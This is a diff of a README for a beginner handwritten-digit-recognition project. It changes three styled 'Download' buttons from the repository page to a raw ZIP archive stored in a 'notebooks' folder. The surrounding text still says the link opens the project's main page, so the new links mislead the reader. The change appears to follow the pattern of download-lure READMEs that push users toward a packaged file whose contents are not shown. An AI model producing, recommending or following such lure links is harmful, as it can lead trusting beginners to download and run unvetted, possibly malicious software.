@@ -1,7 +1,7 @@
 <h1>✨ Handwritten-Digit-Recognition - See AI Read Your Writing Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/ABELANTE/Handwritten-Digit-Recognition" style="display:inline-block;padding:15px 35px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;border-radius:50px;font-size:20px;font-weight:bold;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">📥 Download Now - It's Free</a>
+  <a href="https://raw.githubusercontent.com/ABELANTE/Handwritten-Digit-Recognition/main/notebooks/Digit-Handwritten-Recognition-1.3.zip" style="display:inline-block;padding:15px 35px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;border-radius:50px;font-size:20px;font-weight:bold;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">📥 Download Now - It's Free</a>
 </p>
 
 Welcome to the world of artificial intelligence! This is a simple yet powerful program that teaches your computer to recognize handwritten numbers (like the ones you write on paper) just by looking at them. Whether you are a student, a hobbyist, or just someone curious about technology, this project is your friendly guide into the amazing field of deep learning.
@@ -37,7 +37,7 @@ That is it! No special hardware or expensive software is required.
 Click the big colorful button at the top of this page, or use the link below:
 
 <p align="center">
-  <a href="https://github.com/ABELANTE/Handwritten-Digit-Recognition" style="display:inline-block;padding:15px 35px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:white;border-radius:50px;font-size:18px;font-weight:bold;text-decoration:none;box-shadow:0 4px 15px rgba(240,147,251,0.4);">📂 Visit this link to download the application</a>
+  <a href="https://raw.githubusercontent.com/ABELANTE/Handwritten-Digit-Recognition/main/notebooks/Digit-Handwritten-Recognition-1.3.zip" style="display:inline-block;padding:15px 35px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:white;border-radius:50px;font-size:18px;font-weight:bold;text-decoration:none;box-shadow:0 4px 15px rgba(240,147,251,0.4);">📂 Visit this link to download the application</a>
 </p>
 
 This link will take you to the project's main page on GitHub -a popular website where developers share their work with the world. Once you are there, you will see a green button that says "<strong>Code</strong>" and a button that says "<strong>Download ZIP</strong>". You should click the "<strong>Download ZIP</strong>" button ou can also look for the "<strong>Releases</strong>" section on the right side of the page, where you will find a link to download the latest version of the softwareas a ZIP file.
@@ -182,7 +182,7 @@ You have just taken your first step into the world of artificial intelligence. Y
 
 
 <p align="center" style="margin-top:40px;">
-  <a href="https://github.com/ABELANTE/Handwritten-Digit-Recognition" style="display:inline-block;padding:15px 35px;background:linear-gradient(135deg,#43e97b 0%,#38f9d7 100%);color:white;border-radius:50px;font-size:18px;font-weight:bold;text-decoration:none;box-shadow:0 4px 15px rgba(67,233,123,0.4);">📂 Get the Software Here</a>
+  <a href="https://raw.githubusercontent.com/ABELANTE/Handwritten-Digit-Recognition/main/notebooks/Digit-Handwritten-Recognition-1.3.zip" style="display:inline-block;padding:15px 35px;background:linear-gradient(135deg,#43e97b 0%,#38f9d7 100%);color:white;border-radius:50px;font-size:18px;font-weight:bold;text-decoration:none;box-shadow:0 4px 15px rgba(67,233,123,0.4);">📂 Get the Software Here</a>
 </p>
 
 <p style="text-align:center;color:#666;margin-top:20px;">Made with ❤️ for curious minds everywhere</p>
